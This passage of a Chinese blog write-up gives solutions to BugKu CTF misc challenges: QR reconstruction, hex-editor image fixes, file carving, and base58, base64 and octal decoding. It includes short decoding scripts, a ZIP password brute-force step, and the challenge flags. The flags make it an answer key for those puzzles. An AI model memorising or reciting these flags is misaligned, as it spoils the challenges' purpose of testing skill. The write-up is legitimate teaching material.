class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">,</span>    <span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">]</span>img <span class="token operator">=</span> Image<span class="token punctuation">.</span>new<span class="token punctuation">(</span><span class="token string">"1"</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token number">25</span><span class="token punctuation">,</span> <span class="token number">25</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token builtin">len</span><span class="token punctuation">(</span>data<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">for</span> j <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token builtin">len</span><span class="token punctuation">(</span>data<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token comment"># 左上角定位标志</span>        <span class="token keyword">if</span> i <span class="token operator">&lt;</span> <span class="token number">7</span> <span class="token keyword">and</span> j <span class="token operator">&lt;</span> <span class="token number">7</span><span class="token punctuation">:</span>            img<span class="token punctuation">.</span>putpixel<span class="token punctuation">(</span><span class="token punctuation">(</span>i<span class="token punctuation">,</span> j<span class="token punctuation">)</span><span class="token punctuation">,</span> flag<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">[</span>j<span class="token punctuation">]</span> <span class="token operator">^</span> <span class="token number">1</span><span class="token punctuation">)</span>        <span class="token comment"># 左下角定位标志</span>        <span class="token keyword">elif</span> i <span class="token operator">></span> <span class="token number">17</span> <span class="token keyword">and</span> j <span class="token operator">&lt;</span> <span class="token number">7</span><span class="token punctuation">:</span>            img<span class="token punctuation">.</span>putpixel<span class="token punctuation">(</span><span class="token punctuation">(</span>i<span class="token punctuation">,</span> j<span class="token punctuation">)</span><span class="token punctuation">,</span> flag<span class="token punctuation">[</span>i<span class="token operator">-</span><span class="token number">18</span><span class="token punctuation">]</span><span class="token punctuation">[</span>j<span class="token punctuation">]</span> <span class="token operator">^</span> <span class="token number">1</span><span class="token punctuation">)</span>        <span class="token comment"># 右上角定位标志</span>        <span class="token keyword">elif</span> i <span class="token operator">&lt;</span> <span class="token number">7</span> <span class="token keyword">and</span> j <span class="token operator">></span> <span class="token number">17</span><span class="token punctuation">:</span>            img<span class="token punctuation">.</span>putpixel<span class="token punctuation">(</span><span class="token punctuation">(</span>i<span class="token punctuation">,</span> j<span class="token punctuation">)</span><span class="token punctuation">,</span> flag<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">[</span>j<span class="token operator">-</span><span class="token number">18</span><span class="token punctuation">]</span> <span class="token operator">^</span> <span class="token number">1</span><span class="token punctuation">)</span>        <span class="token keyword">else</span><span class="token punctuation">:</span>            img<span class="token punctuation">.</span>putpixel<span class="token punctuation">(</span><span class="token punctuation">(</span>i<span class="token punctuation">,</span> j<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token builtin">int</span><span class="token punctuation">(</span>data<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">^</span> <span class="token number">1</span><span class="token punctuation">)</span>img<span class="token punctuation">.</span>resize<span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token number">500</span><span class="token punctuation">,</span> <span class="token number">500</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span>show<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>不过我还是看到了一个神奇的解法，<a href="https://blog.csdn.net/qq_52715164/article/details/119054663">来自评论区的神奇解法</a>，这个解法是一种很神奇的操作，将01串放在Excel里，将其设计成正方形的单元格。在把为1的用黑色填充。最后把其他的部分p上……</p><ol><li>之前解其他题也用过一个类似的脚本</li></ol><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> PIL <span class="token keyword">import</span> Imagex <span class="token operator">=</span> <span class="token number">25</span>y <span class="token operator">=</span> <span class="token number">25</span>im <span class="token operator">=</span> Image<span class="token punctuation">.</span>new<span class="token punctuation">(</span><span class="token string">'RGB'</span><span class="token punctuation">,</span> <span class="token punctuation">(</span>x<span class="token punctuation">,</span> y<span class="token punctuation">)</span><span class="token punctuation">)</span>white <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token number">255</span><span class="token punctuation">,</span> <span class="token number">255</span><span class="token punctuation">,</span> <span class="token number">255</span><span class="token punctuation">)</span>black <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token keyword">with</span> <span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">'1.txt'</span><span class="token punctuation">)</span> <span class="token keyword">as</span> f<span class="token punctuation">:</span>    <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span>x<span class="token punctuation">)</span><span class="token punctuation">:</span>        ff <span class="token operator">=</span> f<span class="token punctuation">.</span>readline<span class="token punctuation">(</span><span class="token punctuation">)</span>        <span class="token keyword">for</span> j <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span>y<span class="token punctuation">)</span><span class="token punctuation">:</span>            <span class="token keyword">if</span> ff<span class="token punctuation">[</span>j<span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token string">'1'</span><span class="token punctuation">:</span>                im<span class="token punctuation">.</span>putpixel<span class="token punctuation">(</span><span class="token punctuation">(</span>i<span class="token punctuation">,</span> j<span class="token punctuation">)</span><span class="token punctuation">,</span> black<span class="token punctuation">)</span>            <span class="token keyword">else</span><span class="token punctuation">:</span>                im<span class="token punctuation">.</span>putpixel<span class="token punctuation">(</span><span class="token punctuation">(</span>i<span class="token punctuation">,</span> j<span class="token punctuation">)</span><span class="token punctuation">,</span> white<span class="token punctuation">)</span>im<span class="token punctuation">.</span>resize<span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token number">1000</span><span class="token punctuation">,</span> <span class="token number">1000</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span>show<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>不过这个脚本的问题是在这个题中你还得将三个角上面的01串改成正常的识别区域（下面这个脚本生成的图片清晰度一直令人发指）。</p><p>使用工具扫描二维码得到flag。</p><blockquote><p>flag{QR_c0de_1s_1nterest1n9}</p></blockquote><h5 id="3、这是一张单纯的图片"><a href="#3、这是一张单纯的图片" class="headerlink" title="3、这是一张单纯的图片"></a>3、这是一张单纯的图片</h5><p>这个题怎么说呢？解法多种多样….</p><p>用winhex或者直接用记事本打开都能看到这一串</p><pre class="line-numbers language-none"><code class="language-none">&amp;#107;&amp;#101;&amp;#121;&amp;#123;&amp;#121;&amp;#111;&amp;#117;&amp;#32;&amp;#97;&amp;#114;&amp;#101;&amp;#32;&amp;#114;&amp;#105;&amp;#103;&amp;#104;&amp;#116;&amp;#125;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>实际上这个是 html 编码后的串直接解码得到&#107;&#101;&#121;&#123;&#121;&#111;&#117;&#32;&#97;&#114;&#101;&#32;&#114;&#105;&#103;&#104;&#116;&#125;</p><p>当然我看到评论区有个人的方法是直接改拓展名为是HTML，这样更方便，毕竟这都不需要多一步解码了。</p><h5 id="4、隐写"><a href="#4、隐写" class="headerlink" title="4、隐写"></a>4、隐写</h5><p>这个是最简单的隐写，鼠标右键属性可以查看图片的行高和列宽，都是500，用winhex打开，发现行长为01F4，列高为01A4，修改列高再看图片就行了。</p><blockquote><p>BUGKU{a1e5aSA}</p></blockquote><h5 id="5、telnet"><a href="#5、telnet" class="headerlink" title="5、telnet"></a>5、telnet</h5><p>这个题使用wireshark里面的追踪Tcp流就能直接得到flag。</p><h5 id="6、眼见非实"><a href="#6、眼见非实" class="headerlink" title="6、眼见非实"></a>6、眼见非实</h5><p>打开文件发现里面写了PK，好吧压缩包，改拓展名改为zip，最基础的方式是一个个找好在文件不多用不了几分钟，当然有很多公具能够帮我们完成检索。这里就不一一列举</p><p>得到<strong>flag{F1@g}</strong></p><h5 id="7、啊哒"><a href="#7、啊哒" class="headerlink" title="7、啊哒"></a>7、啊哒</h5><p>这里引入一个工具Formost，这个工具可以拆解文件。下载图片发送到Formost分解得到一个压缩包，压缩包需要密码进行解压，这个时候不要忘记观察图片的属性，属性里有一串16进制的代码，将其转化成字符串就是相应的解压密码sdnisc_2018。得到flag<img src="ada.jpg" alt="ad" style="zoom:50%;" /></p><blockquote><p>flag : flag{3XiF_iNf0rM@ti0n}</p></blockquote><h5 id="8、ping"><a href="#8、ping" class="headerlink" title="8、ping"></a>8、ping</h5><p>这道题我一时间想不到说什么好，这个是正常人想出来的操作，下载得到一个流量包，这个流量包全部是ICMP流，这道题真的跟题目一样是拼， 最简单的解法wireshark打开一个包一个包看下面字符，进行拼接得到flag 。</p><h5 id="9、可爱的故事"><a href="#9、可爱的故事" class="headerlink" title="9、可爱的故事"></a>9、可爱的故事</h5><blockquote><p>可可爱爱没有脑袋</p><p>一‌‍‍‎‍‎‍‌‌‎‌‎‍‌‏‍‏‌‎‌‏‏‍‌‎‍‍‌‎‏‎‍‌‏‎‍‏‏‌‎‍‎‍‌‌‌‎‍‌‌‍‍‌‎‏‍‍‌‏‌‎‍‌‍‌‌‍‌‌‍‌‌‍‌‎‍‍‌‎‌‎‏‍‏‏‌‌‎‌‍‏‎‌‌‍‍‍‌‎个可爱的故事<br>这‍‌‍‌‎‌‏‏‍‌‎‍‌‍‍‎‏‏‌‌‏‌‌‏‌‍‍‌‎‏‍‏‏‌‏‎‎‏‌‌‍‏‍‍‌‎‏‎‌‌‌‏‎‎‎‌‍‍‎‏‎‎‏‏‍‌‌‌‏‏‍‌‌‌‏‏‍‌‌‌是一种奇怪的文字写的故事<br>f‍‌‎‏‎‍‌‏‎‍‏‏‌‏‎‎‏‏‌‏‎‍‎‎‌‌‍‌‌‍‌‌‍‌‎‍‌‏‌‏‎‍‌‎‏‍‍‌‏‌‎‍‌‍lag就藏在其中<br>flag为大兔子说的一句带bugku的话<br>如‌‌‎‎‌‍‌‏‎‎‏‌‌‍‏‍‏‏‍‌‎‍‌‌‎‎‌‍‌‏‎‎‏‌‌‍‏‍‏‏‍‌‎‍‌‌‌‏‏‌‌‌‍‌‎‌‍‏‌‌‏‌‍‍‌‎‍‍‎‏‍‌‎‍‍‎‏‍‍‌‎‏‎‌‌‎‎‌‎‌‍‎‎‎‍‎‌‎‌‏‌‌‏‌‌‍‌‌‍‌‌‍‌‎‌‎‌‍‏‎‌‌‍‍‍‌‎‌‌‏‍‌‎‎‏‏‍‌‌‌果找到了<br>就‌‌‍‏‍‌‌‍‌‎‌‍‏‌‎‏‍‍‌‏‌‎‍‌‍‌‌‏‌‎‌‍‌‏‍‌‏‎‌‍‌‌‍‎‎‌‍‏‎‌‏‌‏‎‍‎‎‍‌‍‌‍‌‍‍‍‏‌‍‌‍‌‌‍‍‏‌‌‏‍‏‏‎‍‌‏‏‎‍‏‍‌‏‎‍‎‍‍‎‎‎‍‌‏‏‌‍‌‍‌‌‌‍‌‌‎‎‌‍‏‏‍‍‍‌把他全部变成小写然后包上bugku{}</p></blockquote><p>来看下这个题给的图片……</p><blockquote><p> 这是人的语言吗？？？？？</p></blockquote><p>直到我看到别人的解答里来了一句，原神里面的提瓦特字母 …….</p><pre class="line-numbers language-none"><code class="language-none">bugku&#123;iamlearningteyvatinbugku&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>得，我裂开了……</p><blockquote><p>2022年3月20日，原神真香</p></blockquote><h5 id="10、赛博朋克"><a href="#10、赛博朋克" class="headerlink" title="10、赛博朋克"></a>10、赛博朋克</h5><p>flag{Hel1o_Wor1e}</p><h5 id="11、猜"><a href="#11、猜" class="headerlink" title="11、猜"></a>11、猜</h5><p>这题还真是猜……, 图中人物名字全拼。打开照片一看刘亦菲，嗯金币-1……</p><pre class="line-numbers language-none"><code class="language-none">flag:   key&#123;liuyifei&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h5 id="12、又一张图片还单纯吗？"><a href="#12、又一张图片还单纯吗？" class="headerlink" title="12、又一张图片还单纯吗？"></a>12、又一张图片还单纯吗？</h5><p>这个题，最简单的方法是使用formost进行分解，分解得到的那张图片上面的就是flag，正常的做法实际上不应该直接使用formost。</p><pre class="line-numbers language-c++" data-language="c++"><code class="language-c++">&#x2F;&#x2F;对于图片隐写题目，推荐先看属性查看是否有隐藏的信息，再使用 010edit 或者winhex查看图片信息&#x2F;&#x2F;使用winhex查看文件， 搜索504b 0304（压缩包头），FFD8FF（jpg文件头） ，89504E47（png文件头）&#x2F;&#x2F;确定在文件中隐藏其他文件时再使用formost进行分解。<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><h5 id="13、社会主义核心价值观"><a href="#13、社会主义核心价值观" class="headerlink" title="13、社会主义核心价值观"></a>13、社会主义核心价值观</h5><p>嗯，这道题是不是可以扔到密码学里面，这是一个神奇的编码，知道有这种编码方式解决就行。</p><h5 id="14、where-is-flag-番外篇"><a href="#14、where-is-flag-番外篇" class="headerlink" title="14、where is flag 番外篇"></a>14、where is flag 番外篇</h5><p>这道题的脑洞是真大……</p><ol><li><p>解压全部文件得到一个加密压缩包，和一堆经过修改的出师表…..</p></li><li><p>在看到这一堆出师表后，我觉得还不如去看看，那个加密压缩包是不是伪加密，用winhex打开，最后一通操作下来确定这个是正常加密……</p></li><li><p>经过刚刚的两部操作，实际上已经确认了这个的解压密码与这一堆叫做出师表文件有关。但是看文件那一堆AAAAA，CCCCC，我觉得这个密码可能是这些字母的数量….结果还是小瞧了出题人。</p></li><li><p> 在评论区有大佬这么提示：**每个文档的字数不一样会对文档的大小产生影响，而有的文档最后之所有有大写字母来填充，那么就是为了凑文档大小的数字！！！ **</p></li><li><p>好家伙这一层实际上是用压缩前的大小减去压缩后大小的差…..</p><pre class="line-numbers language-none"><code class="language-none">75 101 121 58 90 104 117 71 76 64 64 46 48<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>得到这一串，这一串实际上是ascll码的形式，<strong>ZhuGL@@.0</strong>这个就是最好的密码…..</p></li><li><p>得，又一张图片看下里面属性啥也没有，使用winhex打开，拖到最后看到这一串</p><pre class="line-numbers language-none"><code class="language-none">flag in here &#123;LjFWBuxFNTzEWv6t2NfxjNFSH1sQEwBt5wTTLD1fJ&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>结果这个并不是flag…..出题人我劝你善良…..</p><p>里面这一串是base编码，但是不是我们最熟悉的base64，是神奇的base58……</p><blockquote><p><strong>base58</strong>:编码去掉了几个看起来会产生歧义的字符，如 0 (零), O (大写字母O), I (大写的字母i) and l (小写的字母L) ，和几个影响双击选择的字符，如/, +。结果字符集正好58个字符(包括9个数字，24个大写字母，25个小写字母)。 </p></blockquote></li></ol><p> 最后 bugku{th1s_1s_chu_Sh1_B1A0!!@} …..</p><p>说真的出题人我劝你善良…………</p><h5 id="15、贝斯手"><a href="#15、贝斯手" class="headerlink" title="15、贝斯手"></a>15、贝斯手</h5><p>看下题目给的提示……</p><blockquote><p>这剧叫做《缝纫机乐队》，女主叫丁建国，是一名贝斯手，剧中面试的时候，问到腿是怎么回事的时候，回答了”又长又白又细”，我爱了，成功圈粉</p></blockquote><p>txt看上去是没东西了，但实际上这是个假象，在txt最后还有一段提示</p><blockquote><p> 密码我4不会告诉你的，除非你知道我的女神是哪一年出生的给你个提示：申猴，闰年</p></blockquote><p>这里如果说考了什么内容的话，应该说是细心观察和知识检索的能力….</p><pre class="line-numbers language-none"><code class="language-none">5+58&#x3D;&#x3D;327a6c4304ad5938eaf0efb6cc3e53dcCFmZknmK3SDEcMEue1wrsJdqqkt7dXLuS<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>这个其实是一段md5和一段base58，千万别以为是先md5后base58来着….小写的那部分是md5，因为存在0很容易确认，相应的大写的范围是base58</p><p>得到<strong>flag{this_is_md5_and_base58}</strong></p><h5 id="16、隐写2"><a href="#16、隐写2" class="headerlink" title="16、隐写2"></a>16、隐写2</h5><ul><li><p>这个隐写题的难度也不是很大， 从网站上下载下来就是一张图片，同过winhex分析其中包含一个zip压缩包。 使用formost分解即可。得到一个名为flag的压缩包还有一个图片。根据图片提示的信息三位数字…这样直接暴力跑就能得出来了。使用ARCHPR暴力破解就能得到密码871</p></li><li><p>单纯给了三个字母，对应三个数字，肯定不可能是在字母表里的顺序，对应键盘，则Q对应数字1，J对应数字7，K对应数字8（在键盘同一列）。</p><p>得到的是一张图片用winhex打开在最后发现这一串</p><pre class="line-numbers language-none"><code class="language-none">f1@g&#123;eTB1IEFyZSBhIGhAY2tlciE&#x3D;&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>不过里面的是base64编码，稍微解码下得到<strong>flag{y0u Are a h@cker!}</strong></p></li></ul><h5 id="17、普通的二维码"><a href="#17、普通的二维码" class="headerlink" title="17、普通的二维码"></a>17、普通的二维码</h5><ol><li><p>下载得到一张图片是一张二维码，使用工具扫码，他告诉我flag不在这里….</p></li><li><p>使用winhex打开有这一段（这里我已经将其三个一组分开）</p><pre class="line-numbers language-3" data-language="3"><code class="language-3">146，154，141，147，173，110，141，166，145，137，171，060，125，137，120，171，137，163，143，162，151，160，164，137，117，164，143，137，124，157，137，124，145，156，137，101，163，143，151，151，041，175，@xjseck!<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>这里能看出数字永远是0到7，应该是八进制将其转化为10进制，在将其视为对应的ascill码</p></li><li><p>对应脚本</p><pre class="line-numbers language-c++" data-language="c++"><code class="language-c++">#include&lt;stdio.h&gt;int main()&#123;int misc1[42]&#x3D;&#123;146,154,141,147,173,110,141,166,145,137,171,60,125,137,120,171,137,163,143,162,151,160,164,137,117,164,143,137,124,157,137,124,145,156,137,101,163,143,151,151,41,175&#125;;char misc2[42];int a1,a2,a3;for(int i&#x3D;0;i&lt;42;i++)&#123;a1&#x3D;misc1[i]&#x2F;100;a2&#x3D;misc1[i]&#x2F;10%10;a3&#x3D;misc1[i]%10;        misc2[i]&#x3D;a1*8*8+a2*8+a3;&#125;for(int j&#x3D;0;j&lt;42;j++)&#123;printf(&quot;%c&quot;,misc2[j]);&#125;printf(&quot;\n&quot;);    return 0;&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>最后得到flag。</p><pre class="line-numbers language-none"><code class="language-none">flag&#123;Have_y0U_Py_script_Otc_To_Ten_Ascii!&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h5 id="18、多种方法解决"><a href="#18、多种方法解决" class="headerlink" title="18、多种方法解决"></a>18、多种方法解决</h5></li></ol><ul><li><p>将文件转化成txt格式，打开文件里面是这么一堆东西</p><pre class="line-numbers language-none"><code class="language-none">data:image&#x2F;jpg;base64,iVBORw0KGgoAAAANSUhEUgAAAIUAAACFCAYAAAB12js8AAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsMAAA7DAcdvqGQAAArZSURBVHhe7ZKBitxIFgTv&#x2F;396Tx564G1UouicKg19hwPCDcrMJ9m7&#x2F;7n45zfdxe5Z3sJ7prHbf9rXO3P4lLvYPctbeM80dvtP+3pnDp9yF7tneQvvmcZu&#x2F;2lf78zhU+5i9yxv4T3T2O0&#x2F;7eud68OT2H3LCft0l&#x2F;ae9ZlTo+23pPvX7&#x2F;rwJHbfcsI+3aW9Z33m1Gj7Len+9bs+PIndt5ywT3dp71mfOTXafku6f&#x2F;2uD09i9y0n7NNd2nvWZ06Ntt+S7l+&#x2F;68MJc5O0OSWpcyexnFjfcsI+JW1ukpRfv+vDCXOTtDklqXMnsZxY33LCPiVtbpKUX7&#x2F;rwwlzk7Q5JalzJ7GcWN9ywj4lbW6SlF+&#x2F;68MJc5O0OSWpcyexnFjfcsI+JW1ukpRfv+vDCXOTWE7a&#x2F;i72PstJ2zfsHnOTpPz6XR9OmJvEctL2d7H3WU7avmH3mJsk5dfv+nDC3CSWk7a&#x2F;i73PctL2DbvH3CQpv37XhxPmJrGctP1d7H2Wk7Zv2D3mJkn59bs+nDA3ieWEfdNImylJnelp7H6bmyTl1+&#x2F;6cMLcJJYT9k0jbaYkdaansfttbpKUX7&#x2F;rwwlzk1hO2DeNtJmS1Jmexu63uUlSfv2uDyfMTWI5Yd800mZKUmd6Grvf5iZJ+fW7PjzJ7v12b33LSdtvsfuW75LuX7&#x2F;rw5Ps3m&#x2F;31rectP0Wu2&#x2F;5Lun+9bs+PMnu&#x2F;XZvfctJ22+x+5bvku5fv+vDk+zeb&#x2F;fWt5y0&#x2F;Ra7b&#x2F;ku6f71+++HT0v+5l3+tK935vApyd+8y5&#x2F;29c4cPiX5m3f5077emcOnJH&#x2F;zLn&#x2F;ar3d+&#x2F;flBpI+cMDeNtJkSywn79BP5uK+yfzTmppE2U2I5YZ9+Ih&#x2F;3VfaPxtw00mZKLCfs00&#x2F;k477K&#x2F;tGYm0baTInlhH36iSxflT78TpI605bdPbF7lhvct54mvWOaWJ6m4Z0kdaYtu3ti9yw3uG89TXrHNLE8TcM7SepMW3b3xO5ZbnDfepr0jmlieZqGd5LUmbbs7onds9zgvvU06R3TxPXcSxPrW07YpyR1pqTNKUmdKUmdk5LUaXzdWB&#x2F;eYX3LCfuUpM6UtDklqTMlqXNSkjqNrxvrwzusbzlhn5LUmZI2pyR1piR1TkpSp&#x2F;F1Y314h&#x2F;UtJ+xTkjpT0uaUpM6UpM5JSeo0ft34+vOGNLqDfUosN7inhvUtJ+ybRtpMd0n39Goa3cE+JZYb3FPD+pYT9k0jbaa7pHt6NY3uYJ8Syw3uqWF9ywn7ppE2013SPb2aRnewT4nlBvfUsL7lhH3TSJvpLunecjWV7mCftqQbjSR1puR03tqSbkx&#x2F;wrJqj7JPW9KNRpI6U3I6b21JN6Y&#x2F;YVm1R9mnLelGI0mdKTmdt7akG9OfsKzao+zTlnSjkaTOlJzOW1vSjelPWFbp8NRImylJnWnL7r6F7zN3STcb32FppUNTI22mJHWmLbv7Fr7P3CXdbHyHpZUOTY20mZLUmbbs7lv4PnOXdLPxHZZWOjQ10mZKUmfasrtv4fvMXdLNxndYWunQlFhutHv2W42n+4bds7wl3VuuskSJ5Ua7Z7&#x2F;VeLpv2D3LW9K95SpLlFhutHv2W42n+4bds7wl3VuuskSJ5Ua7Z7&#x2F;VeLpv2D3LW9K97avp6GQ334X3KWlz+tukb5j+hO2&#x2F;hX3Ebr4L71PS5vS3Sd8w&#x2F;Qnbfwv7iN18F96npM3pb5O+YfoTtv8W9hG7+S68T0mb098mfcP0Jxz&#x2F;W+x+FPethvUtN2y&#x2F;m7fwnvm1+frzIOklDdy3Gta33LD9bt7Ce+bX5uvPg6SXNHDfaljfcsP2u3kL75lfm68&#x2F;D5Je0sB9q2F9yw3b7+YtvGd+bb7+vCEN7ySpMzXSZrqL3bOcsN9Kns4T2uJRk6TO1Eib6S52z3LCfit5Ok9oi0dNkjpTI22mu9g9ywn7reTpPKEtHjVJ6kyNtJnuYvcsJ+y3kqfzxNLiEUosJ+xTYvkudt9yg3tqpM2d5Cf50mKJEssJ+5RYvovdt9zgnhppcyf5Sb60WKLEcsI+JZbvYvctN7inRtrcSX6SLy2WKLGcsE+J5bvYfcsN7qmRNneSn+RLK5UmbW4Sywn7lOzmhH3a0u7ZN99hadmRNjeJ5YR9SnZzwj5taffsm++wtOxIm5vEcsI+Jbs5YZ+2tHv2zXdYWnakzU1iOWGfkt2csE9b2j375jtcvTz+tuX0vrXF9sxNkjrTT+T6rvyx37ac3re22J65SVJn+olc35U&#x2F;9tuW0&#x2F;vWFtszN0nqTD+R67vyx37bcnrf2mJ75iZJneknUn+V&#x2F;aWYUyNtpqTNqZE2UyNtGlvSjTsT9VvtKHNqpM2UtDk10mZqpE1jS7pxZ6J+qx1lTo20mZI2p0baTI20aWxJN+5M1G+1o8ypkTZT0ubUSJupkTaNLenGnYnl6TujO2zP3DTSZkp2c8L+0xppM32HpfWTIxPbMzeNtJmS3Zyw&#x2F;7RG2kzfYWn95MjE9sxNI22mZDcn7D+tkTbTd1haPzkysT1z00ibKdnNCftPa6TN9B2uXh5&#x2F;S9rcbEk37jR2+5SkzpSkzo4kdaavTg6&#x2F;JW1utqQbdxq7fUpSZ0pSZ0eSOtNXJ4ffkjY3W9KNO43dPiWpMyWpsyNJnemrk8NvSZubLenGncZun5LUmZLU2ZGkzvTVWR&#x2F;e0faJ7Xdzw&#x2F;bMKbGc7PbNE1x3uqNtn9h+Nzdsz5wSy8lu3zzBdac72vaJ7Xdzw&#x2F;bMKbGc7PbNE1x3uqNtn9h+Nzdsz5wSy8lu3zzBcsVewpyS1LmTWG7Y3nLCPm1JN05KLP&#x2F;D8tRGzClJnTuJ5YbtLSfs05Z046TE8j8sT23EnJLUuZNYbtjecsI+bUk3Tkos&#x2F;8Py1EbMKUmdO4nlhu0tJ+zTlnTjpMTyP&#x2F;R&#x2F;i8PwI&#x2F;&#x2F;fJZYb3Jvv8Pd&#x2F;il+WWG5wb77D3&#x2F;8pflliucG9+Q5&#x2F;&#x2F;6f4ZYnlBvfmO1y9PH7KFttbfhq+zySpMyVtbr7D1cvjp2yxveWn4ftMkjpT0ubmO1y9PH7KFttbfhq+zySpMyVtbr7D1cvjp2yxveWn4ftMkjpT0ubmO1y9ftRg9y0n7FPD+paTtk9O71sT13Mv7WD3LSfsU8P6lpO2T07vWxPXcy&#x2F;tYPctJ+xTw&#x2F;qWk7ZPTu9bE9dzL+1g9y0n7FPD+paTtk9O71sT1&#x2F;P7EnOTWG5wb5LUmRptn3D&#x2F;6b6+eX04YW4Syw3uTZI6U6PtE+4&#x2F;3dc3rw8nzE1iucG9SVJnarR9wv2n+&#x2F;rm9eGEuUksN7g3SepMjbZPuP90X9+8PpwwN0mb72pYfzcn1rf8NHwffXXWhxPmJmnzXQ3r7+bE+pafhu+jr876cMLcJG2+q2H93ZxY3&#x2F;LT8H301VkfTpibpM13Nay&#x2F;mxPrW34avo++OuvDCXOT7OZGu7e+5YT9XYnlhH36DlfvfsTcJLu50e6tbzlhf1diOWGfvsPVux8xN8lubrR761tO2N+VWE7Yp+9w9e5HzE2ymxvt3vqWE&#x2F;Z3JZYT9uk7XL1+1GD3LX8avt8klhu2t5yc6F+&#x2F;68OT2H3Ln4bvN4nlhu0tJyf61+&#x2F;68CR23&#x2F;Kn4ftNYrlhe8vJif71uz48id23&#x2F;Gn4fpNYbtjecnKif&#x2F;3+++HTnub0fd4zieUtvLfrO1y9PH7K05y+z3smsbyF93Z9h6uXx095mtP3ec8klrfw3q7vcPXy+ClPc&#x2F;o+75nE8hbe2&#x2F;Udzv9X+sv&#x2F;OP&#x2F;881&#x2F;SqtvcdpBh+wAAAABJRU5ErkJggg&#x3D;&#x3D;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>最后的==很明显能够说明这里是一个base编码，盲猜base64，同时题目信息又有提示说：在解题过程中会得到一张二维码….显然这个是考的base64转图片。</p><p>通过线上的工具将base64编码转换为图片，扫码得到flag。<strong>KEY{dca57f966e4e4e31fd5b15417da63269}</strong></p><h5 id="19、where-is-flag"><a href="#19、where-is-flag" class="headerlink" title="19、where is flag"></a>19、where is flag</h5></li><li><p>之前做的那个where is flag番外篇的灵感估计就是来自于这里…..</p></li><li><p>解压得到十个空的txt文件，但是这个大小却绝对不是空txt文件该有的样子，应该是在文件里隐藏了什么…</p></li><li><p>使用winhex打开里面都是用的0来占位，对应到txt里面就是一个个的空格</p></li></ul><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">for</span> n <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">11</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    name <span class="token operator">=</span> <span class="token builtin">str</span><span class="token punctuation">(</span>n<span class="token punctuation">)</span><span class="token operator">+</span><span class="token string">'.txt'</span>    <span class="token keyword">with</span> <span class="token builtin">open</span><span class="token punctuation">(</span>name<span class="token punctuation">)</span> <span class="token keyword">as</span> f<span class="token punctuation">:</span>        <span class="token keyword">print</span><span class="token 